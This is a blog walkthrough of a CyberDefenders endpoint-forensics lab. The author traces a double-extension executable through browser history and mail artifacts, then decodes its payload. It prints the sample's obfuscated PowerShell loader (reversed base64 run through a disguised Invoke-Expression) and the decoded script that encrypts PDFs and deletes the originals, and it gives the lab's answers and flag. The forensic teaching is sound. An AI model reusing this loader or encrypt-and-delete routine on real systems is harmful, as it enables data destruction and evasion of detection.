---
title: Endpoint Forensics - Silent Breach @CyberDefender
date: 2025-08-30 00:00:00 +0700
categories: [dfir, blue-teaming, cyber-defender]
tags: [digital-forensics, endpoint-forensics]
author: <author_id>
description: Silent Breach Lab @CyberDefender Walkthrough
# toc: false # Uncomment to disable the Table of Contents in the right panel
# comments: false # Uncomment to disable comments
image: /assets/images/preview/cyberdefenders_og.png
--- 

### Scenario 

The IMF is hit by a cyber attack compromising sensitive data. Luther sends Ethan to retrieve crucial information from a compromised server. Despite warnings, Ethan downloads the intel, which later becomes unreadable. To recover it, he creates a forensic image and asks Benji for help in decoding the files.

Resources:
- [Windows Mail Artifacts: Microsoft HxStore.hxd (email) Research](https://boncaldoforensics.wordpress.com/2018/12/09/microsoft-hxstore-hxd-email-research/)

### Data Collected 
- ethanPC.ad1 ~ 700 MB in size

### Tools 
- FTK Imager

### Questions 

#### Q1: What is the MD5 hash of the potentially malicious EXE file the user downloaded?

Let's ingest case image into FTK Imager: File -> Add Evidence Item -> Image File -> /path/to/ethanPC.ad1. 

You will get something like below image if you add the evidence correctly.

![pic1](assets/images/cyberdefender/silentbreach/pic1.png)

Navigate to Downloads folder, there was a file name `IMF-Info.pdf.exe` indicated a malicious executable that mimic like a PDF file abuse double extension - More information on [MITRE ATT&CK](https://attack.mitre.org/techniques/T1036/007/)

![pic2](assets/images/cyberdefender/silentbreach/pic2.png)

pestudio shows few interesting information about this malicious executable, such as compiled timestamp, operating system, also, few hit from VirusTotal

![pic3](assets/images/cyberdefender/silentbreach/pic3.png)

![pic4](assets/images/cyberdefender/silentbreach/pic4.png)

FTKImage has a feature help us identify hash value of any file in an image by right click on a file -> Export File Hash List

```shell
MD5,SHA1,FileNames
"336a7cf476ebc7548c93507339196abb","f0847df8a58527cc34b96876efaae941865555fd","ethanPC.ad1\C:\\NONAME [NTFS]\[root]\Users\ethan [AD1]\Downloads\IMF-Info.pdf.exe"
"7f7b5763818a5a76e3e7fe305dadac05","4c571648e75ddbfae5f44f68f18abda902fd3c26","ethanPC.ad1\C:\\NONAME [NTFS]\[root]\Users\ethan [AD1]\Downloads\IMF-Info.pdf.exe\Zone.Identifier"

Compare it with hash value got from Powershell Get-FileHash

PS C:\Users\Administrator\Desktop\CyberDefender\EndpointForensics\Silent_Breach\temp_extract_dir> get-filehash -Algorithm MD5 .\IMF-Info.pdf.exe

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             336A7CF476EBC7548C93507339196ABB                                       C:\Users\Administrator\Deskto...
```

>ANSWER: `336a7cf476ebc7548c93507339196abb`
{: .prompt-info }

> Take a step further before moving on to other questions, we could utilize tool such as `strings.exe` from Sysinternal Suite to get more information from this particular malicious file `.\strings.exe -n 20 .\IMF-Info.pdf.exe  > strings.txt`
{: .prompt-tip }

From those junky JavaScript, i deteced i snippet of code that leveraged Powershell to run a malicous `.ps1`

```shell
C:\Users\ethan\AppData\Local\Temp
Gz3m6mG3j2TyAqF2Zx4v.ps1
$wy7qIGPnm36HpvjrL2TMUaRbz = "K0QfK0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSBCIgAiCNoQDpgSZz9GbD5SbhVmc0NFd19GJgACIgoQDpgSZz9GbD5SbhVmc0N1b0BXeyNGJgACIgoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJgACIgoQDpgGdn5WZM5yclRXeC5WahxGckACLwACLzVGd5JkbpFGbwRCKlRXaydlLtFWZyR3UvRHc5J3YkACIgAiCNoQDpUGdpJ3V6oTXlR2bN1WYlJHdT9GdwlncD5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3UbBCLy9Gdwlncj5WZkACLtFWZyR3U0V3bkgSbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3UvRHc5J3YkACIgAiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkACIgAiCNoQDpUGbpZEd1BnbpRCKzVGd5JEbsFEZhVmU6oTXlxWaG5yTJ5SblR3c5N1Wg0DIzVGd5JkbpFGbwRCIgACIK0gCNkCKy9Gdwlncj5WRlRXYlJ3QuMXZhRCI9AicvRHc5J3YuVGJgACIgoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJgACIgoQDDJ0Q6oTXlR2bNJXZoBXaD5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3UbBSPgUGZv1kLzVWYkACIgAiCNYXakASPgYVSuMXZhRCIgACIK0QeltGJg0DI5V2SuMXZhRCIgACIK0QKoUGdhVmcDpjOdNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3UbBSPgMXZhRCIgACIK0gCNcyYuVmLnACLnQiZkBnLcdCIlNWYsBXZy1CIlxWaGRXdw5WakASPgUGbpZEd1BHd19GJgACIgoQD7BSKzVGbpZEd1BnbpRCIulGIlxWaGRXdw5WakgCIoNWYlJ3bmpQDK0QKK0gImRGcu42bpN3cp1ULG1UScxFcvR3azVGRcxlbhhGdlxFXzJXZzVFXcpzQiACIgAiCNwiImRGcuQXZyNWZT1iRNlEXcB3b0t2clREXc5WYoRXZcx1cyV2cVxFX6MkIgACIgoQDoAEI9AyclxWaGRXdw5WakoQDzVGbpZGI0VHculGIm9GI0NXaMByIK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQyYlNVNyAjMj8mZuFiZtlkIg0DIkJ3b3N3chBHJ" ;
$9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray() ; [array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6) ; -join $9U5RgiwHSYtbsoLuD3Vf6 2>&1> $null ;
$FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng("$9U5RgiwHSYtbsoLuD3Vf6")) ;
$9ozWfHXdm8eIBYru = "InV"+"okE"+"-ex"+"prE"+"SsI"+"ON" ; new-aliaS -Name PwN -ValUe $9ozWfHXdm8eIBYru -fOrce ; pwn $FHG7xpKlVqaDNgu1c2Utw ;
The light mode will activate in a few minutes.
powershell.exe -ExecutionPolicy Bypass -File "
Failed to delete script: 
Script deleted successfully.
```
![pic5](assets/images/cyberdefender/silentbreach/pic5.png)

That's interesting, let's break it down by trying to decode above code snippet.

First i see adversary defined a variable with a junky name `wy7qIGPnm36HpvjrL2TMUaRbz` following with payload `"K0QfK0QZjJ3bG1CIlxWaGRXdw5Wak...`.

Then another variable named `9U5RgiwHSYtbsoLuD3Vf6` take payload from `wy7qIGPnm36HpvjrL2TMUaRbz` and reverse it, decode the payload and execute via `Invoke-Expression` - `"InV"+"okE"+"-ex"+"prE"+"SsI"+"ON"`

CyberChef is my go to tool for such case, first by using Reverse Operation and then From Base64 Option, below are readable Powershell script has been used on the the server 

```powershell
$password = "Imf!nfo#2025Sec$"
$salt = [Byte[]](0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08)
$iterations = 10000
$keySize = 32   
$ivSize = 16 

$deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
$key = $deriveBytes.GetBytes($keySize)
$iv = $deriveBytes.GetBytes($ivSize)

# List of input files
$inputFiles = @(
    "C:\\Users\\ethan\\Desktop\\IMF-Secret.pdf",
    "C:\\Users\\ethan\\Desktop\\IMF-Mission.pdf"
)

foreach ($inputFile in $inputFiles) {
    $outputFile = $inputFile -replace '\.pdf$', '.enc'

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $encryptor = $aes.CreateEncryptor()

    $plainBytes = [System.IO.File]::ReadAllBytes($inputFile)

    $outStream = New-Object System.IO.FileStream($outputFile, [System.IO.FileMode]::Create)
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

    $cryptoStream.Write($plainBytes, 0, $plainBytes.Length)
    $cryptoStream.FlushFinalBlock()

    $cryptoStream.Close()
    $outStream.Close()

    Remove-Item $inputFile -Force
}
```
I'll analyze this script after, when we facing a question that need to solved by analyze this code.

#### Q2: What is the URL from which the file was downloaded?

One of the most important phase when performing an investigation is to determine the incident entry point, so the organization can strengthen its defenses to mitigate similar threats in the future.

I would say that social engineering, in particular, phishing, is one of the most dangerous threats compared to others.

From the victim’s perspective, there are plenty of artifacts that we can extract from a case image:
- Drive-by compromise: user visits a fake or malicious site and downloads malware (possibly cracked software, or a redirect to a malware-hosting site. For example, I once analyzed a case where the user was redirected to a site hosting a malicious software bundle and was compromised after downloading and running it).
- The user receives a phishing email and downloads the attached file.

These two might be the simplest scenarios, but they play a huge role on the Internet. Artifacts from those activities could include Browser History, `Webcache.dat`, or Outlook email evidence `(.eml)`.

Another noteworthy category of artifacts is user execution or file activities (open, delete, etc), these can be extracted from various locations in Windows such as `$MFT` or USN Journal, as well as MRU entries inside `NTUSER.dat`. In addition, Prefetch, Shimcache, and Amcache, SRUM artifacts are very useful when determining user file activity during an incident.

In such case, i would like to extract Browser History from the case image to see user's activities on browser.

Location: 
- `AppData\Local\Microsoft\Edge\UserData\Default\` 
- `AppData\Local\Goole\Chrome\UserData\Default\` 

And utilize tool such as [BrowsingHistoryView](https://www.nirsoft.net/utils/browsing_history_view.html) to analyze Broswer History. But for this such case, i used a forensic tool call [hindsight](https://github.com/obsidianforensics/hindsight) to analyze Browswer Activities of the user.

First step is extract Default folder from both Chrome and Edge

![pic9](assets/images/cyberdefender/silentbreach/pic9.png)

```powershell
PS C:\Get-ZimmermanTools> .\hindsight.exe -i C:\Users\Administrator\Desktop\CyberDefender\EndpointForensics\Silent_Breach\temp_extract_dir\chrome\Default -o C:\Users\Administrator\Desktop\CyberDefender\EndpointForensics\Silent_Breach\temp_extract_dir

PS C:\Get-ZimmermanTools> .\hindsight.exe -i C:\Users\Administrator\Desktop\CyberDefender\EndpointForensics\Silent_Breach\temp_extract_dir\edge\Default -o C:\Users\Administrator\Desktop\CyberDefender\EndpointForensics\Silent_Breach\temp_extract_dir
```
Example output:
```powershell
################################################################################

                   _     _           _     _       _     _
                  | |   (_)         | |   (_)     | |   | |
                  | |__  _ _ __   __| |___ _  __ _| |__ | |_
                  | '_ \| | '_ \ / _` / __| |/ _` | '_ \| __|
                  | | | | | | | | (_| \__ \ | (_| | | | | |_
                  |_| |_|_|_| |_|\__,_|___/_|\__, |_| |_|\__|
                                              __/ |
                       by ryan@hindsig.ht    |___/ v2025.03

################################################################################

       Start time: 2025-08-30 16:31:10.230
  Input directory: C:\Users\Administrator\Desktop\CyberDefender\EndpointForensics\Silent_Breach\temp_extract_dir\chrome\Default
      Output name: C:\Users\Administrator\Desktop\CyberDefender\EndpointForensics\Silent_Breach\temp_extract_dir.xlsx

 Processing:

    Profile: ...r\EndpointForensics\Silent_Breach\temp_extract_dir\chrome\Default
                     Detected Chrome version:           [ 130-134 ]
                                 URL records:            [     23 ]
                            Download records:            [      3 ]
                           IndexedDB records:            [      2 ]
                               Cache records:            [    885 ]
                           GPU Cache records:            [      0 ]
                            Autofill records:            [      0 ]
                       Local Storage records:            [    104 ]
                     Session Storage records:            [    114 ]
                                  Extensions:            [      2 ]
                          Login Data records:            [      0 ]
                            Preference Items:            [     30 ]
                Site Characteristics records:            [      5 ]
                            DIPS Popup Items:            [      0 ]
                                  DIPS Items:            [     14 ]
                     Extension Rules records:            [      0 ]
                   Extension Scripts records:            [      0 ]
                     Extension State records:            [      0 ]
            Local Extension Settings records:            [      1 ]
                              Cookie records:            [     44 ]
                                HSTS records:            [     20 ]

 Running plugins:
          Chrome Extension Names (v20240428):   - 0 extension URLs parsed -
       Generic Timestamp Decoder (v20240428):     - 0 timestamps parsed -
  Google Analytics Cookie Parser (v20170130):       - 0 cookies parsed -
                 Google Searches (v20160912):      - 7 searches parsed -
    Load Balancer Cookie Decoder (v20200213):       - 0 cookies parsed -
         Quantcast Cookie Parser (v20160907):       - 0 cookies parsed -
             Query String Parser (v20170225):   - 405 query strings parsed -
         Time Discrepancy Finder (v20170129):     - 0 differences parsed -

 Writing C:\Users\Administrator\Desktop\CyberDefender\EndpointForensics\Silent_Breach\temp_extract_dir.xlsx
```

Examine output by one of my favorite tool [Timeline Explorer](https://www.sans.org/tools/timeline-explorer) made by Eric Zimmerman

![pic10](assets/images/cyberdefender/silentbreach/pic10.png)
_Now we could easily extract artifact from both Chrome and Edge activities_

Just after few seconds, below is browswer activities relate to suspicious files, i would like to thankful to Eric and Hindsight contributors that created such a powerful forensic tools. 

![pic11](assets/images/cyberdefender/silentbreach/pic11.png)

> ANSWER: `http://192.168.16.128:8000/IMF-Info.pdf.exe`
{: .prompt-info } 

#### Q3: What application did the user use to download this file?

Since related activities only show up in Edge section, basically indicates user downloaded malicious files by using Microsoft's browser which is Microsoft Edge.

> ANSWER: `Microsoft Edge`
{: .prompt-info }

#### Q4: By examining Windows Mail artifacts, we found an email address mentioning three IP addresses of servers that are at risk or compromised. What are the IP addresses?

This question interesing, since i dont have much exp about Windows Mail artifact, it took me a while to really understand such situation.

Commonly, those artifacts is under `AppData\Local\Commns\Unistore\data`, below is the list of data that you need to know:
- `AppData\Local\Comms\Unistore\data\0`; Windows phone data
- `AppData\Local\Comms\Unistore\data\2`; contact lists within the account
- `AppData\Local\Comms\Unistore\data\3`; the contents/body of the email
- `AppData\Local\Comms\Unistore\data\5`; calendar invitations
- `AppData\Local\Comms\Unistore\data\7`; email attachments
- `AppData\Local\Comms\Unistore\data\33`; contents of invitations 

Also, there is one file name `store.vol` under `AppData\Local\Commns\UnistoreDB\` that contains all information relate to Windows Mail artifacts

Sources:
- https://www.sciencedirect.com/science/article/abs/pii/S1742287617303547
- https://darkdefender.medium.com/windows-10-mail-app-forensics-39025f5418d2

But, only one folder `5` under `data` folder, and also, when i extracted `store.vol` and view it using ESDB viewer, there were no information such message and email contents. 

![pic12](assets/images/cyberdefender/silentbreach/pic12.png)

Since we couldn't rely on above artifacts, find alternative solutions is a must, and it led to another artifact called `HxStore'.hxd`

Sources:
- https://boncaldoforensics.wordpress.com/2018/12/09/microsoft-hxstore-hxd-email-research/

This particular file is under `Appdata\Local\Packages\microsoft.windowscommucationapps_8wekyb3d8bbwe\LocalState`

![pic13](assets/images/cyberdefender/silentbreach/pic13.png)

Extract the artifact and view it using Hex Editor, we could manage to found content of email by searching `@body` at offset `1652DF`

![pic14](assets/images/cyberdefender/silentbreach/pic14.png)

But it nearly impossible to extract IP addresses informaton those those Decoded text, we must find better solution to solve this challenge. 

Well, from question 1, to extract Powershell Script from malicious executable, which tool has been used ?! YES, `string.exe`

We could use `strings.exe` conjunct with regular expression to extract IP address from `HxStore.hxd`, below are command i used to extract artifacts from it.

```powershell
PS C:\Users\Administrator\Desktop\CyberDefender\EndpointForensics\Silent_Breach\temp_extract_dir> .\strings.exe .\HxStore.hxd | Select-String -Pattern '\b\d{1,3}(\.\d{1,3}){3}\b' | ForEach-Object { $_.Matches.Value }
145.67.29.88         |
212.33.10.112        | 1 set from an email, total of 6 sets
192.168.16.128       |
145.67.29.88
212.33.10.112
192.168.16.128
145.67.29.88
212.33.10.112
192.168.16.128
145.67.29.88
212.33.10.112
192.168.16.128
145.67.29.88
212.33.10.112
192.168.16.128
145.67.29.88
212.33.10.112
192.168.16.128
```

> ANSWER: `145.67.29.88,212.33.10.112,192.168.16.128`
{: .prompt-info }

#### Q5: By examining the malicious executable, we found that it uses an obfuscated PowerShell script to decrypt specific files. What predefined password does the script use for encryption?

Let's go back to code snippet in the Question 1 which is captured in malicious excutable `INF-Info.pdf.exe`

```powershell
$password = "Imf!nfo#2025Sec$"
$salt = [Byte[]](0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08)
$iterations = 10000
$keySize = 32   
$ivSize = 16 

$deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
$key = $deriveBytes.GetBytes($keySize)
$iv = $deriveBytes.GetBytes($ivSize)

# List of input files
$inputFiles = @(
    "C:\\Users\\ethan\\Desktop\\IMF-Secret.pdf",
    "C:\\Users\\ethan\\Desktop\\IMF-Mission.pdf"
)

foreach ($inputFile in $inputFiles) {
    $outputFile = $inputFile -replace '\.pdf$', '.enc'

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $encryptor = $aes.CreateEncryptor()

    $plainBytes = [System.IO.File]::ReadAllBytes($inputFile)

    $outStream = New-Object System.IO.FileStream($outputFile, [System.IO.FileMode]::Create)
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

    $cryptoStream.Write($plainBytes, 0, $plainBytes.Length)
    $cryptoStream.FlushFinalBlock()

    $cryptoStream.Close()
    $outStream.Close()

    Remove-Item $inputFile -Force
}
```

The first adversary did is defind hardcoded password for encryption key, salt value, number of interation, key size and initialization vector.
```powershell
$password = "Imf!nfo#2025Sec$"
$salt = [Byte[]](0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08)
$iterations = 10000
$keySize = 32   
$ivSize = 16 
```

And then, create encryption key and IV by taking pre-defined values, utilize Microsoft built-in encyrption [`Rfc2898DeriveBytes Class`](https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.rfc2898derivebytes?view=net-9.0) 

```powershell
$deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
$key = $deriveBytes.GetBytes($keySize)
$iv = $deriveBytes.GetBytes($ivSize)
```

Threat actor looking for critical data in server, in this case: `IMF-Secret.pdf` and `IMF-Mission.pdf` on user desktop
```powershell
$inputFiles = @(
    "C:\\Users\\ethan\\Desktop\\IMF-Secret.pdf",
    "C:\\Users\\ethan\\Desktop\\IMF-Mission.pdf"
)
```

Main encryption activity is under this code snippet, i put comment on each code section for easier to understand the code.
```powershell
foreach ($inputFile in $inputFiles) {
    $outputFile = $inputFile -replace '\.pdf$', '.enc' ------- Take previous critical data and change its file extention to .enc

    $aes = [System.Security.Cryptography.Aes]::Create() ----- Create AES key by taking value from above function
    $aes.Key = $key
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $encryptor = $aes.CreateEncryptor() ----- Create encryptor, prepare for encryption phase 

    $plainBytes = [System.IO.File]::ReadAllBytes($inputFile) ------ Read data from two pdf files

    $outStream = New-Object System.IO.FileStream($outputFile, [System.IO.FileMode]::Create) ----- Create new file 
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write) <------ Wrap it with encryption

    $cryptoStream.Write($plainBytes, 0, $plainBytes.Length)
    $cryptoStream.FlushFinalBlock()

    $cryptoStream.Close()
    $outStream.Close()

    Remove-Item $inputFile -Force ------- Remove original files, in this scenario are two critical pdf files
}
```

> ANSWER: `Imf!nfo#2025Sec$`
{: .prompt-info }

#### Q6: After identifying how the script works, decrypt the files and submit the secret string.

Since the malicous base64 encoded code has been reversed, we can easily decrypt two encrypted files by manipulated the enryption script.

Let's take a look into an C# example from Microsoft that uses the [Rfc2898DeriveBytes](https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.rfc2898derivebytes?view=net-9.0) class to encrypt and also decrypt the data

```c#
using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;

public class rfc2898test
{
    // Generate a key k1 with password pwd1 and salt salt1.
    // Generate a key k2 with password pwd1 and salt salt1.
    // Encrypt data1 with key k1 using symmetric encryption, creating edata1.
    // Decrypt edata1 with key k2 using symmetric decryption, creating data2.
    // data2 should equal data1.

    private const string usageText = "Usage: RFC2898 <password>\nYou must specify the password for encryption.\n";
    public static void Main(string[] passwordargs)
    {
        //If no file name is specified, write usage text.
        if (passwordargs.Length == 0)
        {
            Console.WriteLine(usageText);
        }
        else
        {
            string pwd1 = passwordargs[0];
            // Create a byte array to hold the random value.
            byte[] salt1 = new byte[8];
            using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
            {
                // Fill the array with a random value.
                rng.GetBytes(salt1);
            }

            //data1 can be a string or contents of a file.
            string data1 = "Some test data";
            //The default iteration count is 1000 so the two methods use the same iteration count.
            int myIterations = 1000;
            try
            {
                Rfc2898DeriveBytes k1 = new Rfc2898DeriveBytes(pwd1, salt1,
myIterations);
                Rfc2898DeriveBytes k2 = new Rfc2898DeriveBytes(pwd1, salt1);
                // Encrypt the data.
                Aes encAlg = Aes.Create();
                encAlg.Key = k1.GetBytes(16);
                MemoryStream encryptionStream = new MemoryStream();
                CryptoStream encrypt = new CryptoStream(encryptionStream,
encAlg.CreateEncryptor(), CryptoStreamMode.Write);
                byte[] utfD1 = new System.Text.UTF8Encoding(false).GetBytes(
data1);

                encrypt.Write(utfD1, 0, utfD1.Length);
                encrypt.FlushFinalBlock();
                encrypt.Close();
                byte[] edata1 = encryptionStream.ToArray();
                k1.Reset();

                // Try to decrypt, thus showing it can be round-tripped.
                Aes decAlg = Aes.Create();
                decAlg.Key = k2.GetBytes(16);
                decAlg.IV = encAlg.IV;
                MemoryStream decryptionStreamBacking = new MemoryStream();
                CryptoStream decrypt = new CryptoStream(
decryptionStreamBacking, decAlg.CreateDecryptor(), CryptoStreamMode.Write);
                decrypt.Write(edata1, 0, edata1.Length);
                decrypt.Flush();
                decrypt.Close();
                k2.Reset();
                string data2 = new UTF8Encoding(false).GetString(
decryptionStreamBacking.ToArray());

                if (!data1.Equals(data2))
                {
                    Console.WriteLine("Error: The two values are not equal.");
                }
                else
                {
                    Console.WriteLine("The two values are equal.");
                    Console.WriteLine("k1 iterations: {0}", k1.IterationCount);
                    Console.WriteLine("k2 iterations: {0}", k2.IterationCount);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Error: {0}", e);
            }
        }
    }
}
```

The main point here is to create Encryptor / Decryptor associates with Encrypt or Decrypt phase - `encAlg.CreateEncryptor()` and `decAlg.CreateDecryptor()` function.

So, to decrypt two encrypted `.pdf` file, we just simply change from encryptor to decryptor, below are the script that you could use to retrieve original file, before encrypted.

`decrytor.ps1`:
```powershell

$password = "Imf!nfo#2025Sec$"
$salt = [Byte[]](0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08)
$iterations = 10000
$keySize = 32
$ivSize = 16

# Derive key & IV (must match encryption)
$deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
$key = $deriveBytes.GetBytes($keySize)
$iv = $deriveBytes.GetBytes($ivSize)

# List of encrypted files
$encryptedFiles = @(
    "C:\\Users\\Administrator\\Desktop\\CyberDefender\\EndpointForensics\\Silent_Breach\\temp_extract_dir\\IMF-Secret.enc",
    "C:\\Users\\Administrator\\Desktop\\CyberDefender\\EndpointForensics\\Silent_Breach\\temp_extract_dir\\IMF-Mission.enc"
)

foreach ($encFile in $encryptedFiles) {
    $outputFile = $encFile -replace '\.enc$', '.pdf'

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $decryptor = $aes.CreateDecryptor() --------------- NOTICE THIS ONE !!

    $cipherBytes = [System.IO.File]::ReadAllBytes($encFile)

    $inStream = New-Object System.IO.MemoryStream(,$cipherBytes)
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($inStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)

    $outStream = New-Object System.IO.FileStream($outputFile, [System.IO.FileMode]::Create)

    $buffer = New-Object byte[] 4096
    while (($bytesRead = $cryptoStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
        $outStream.Write($buffer, 0, $bytesRead)
    }

    $cryptoStream.Close()
    $outStream.Close()
    $inStream.Close()
}
```

And then run the script to decrypt two `.enc` files
```powershell
PS C:\Users\Administrator\Desktop\CyberDefender\EndpointForensics\Silent_Breach\temp_extract_dir> .\decryptor.ps1
```

![pic7](assets/images/cyberdefender/silentbreach/pic7.png)

One of those files - `IMF-Mission.pdf` contains flag that we need to retrieve.

![pic8](assets/images/cyberdefender/silentbreach/pic8.png)

>ANSWER: `CyberDefenders{N3v3r_eX3cuTe_F!l3$_dOwnL0ded_fr0m_M@lic10u5_$erV3r}`
{: .prompt-info }
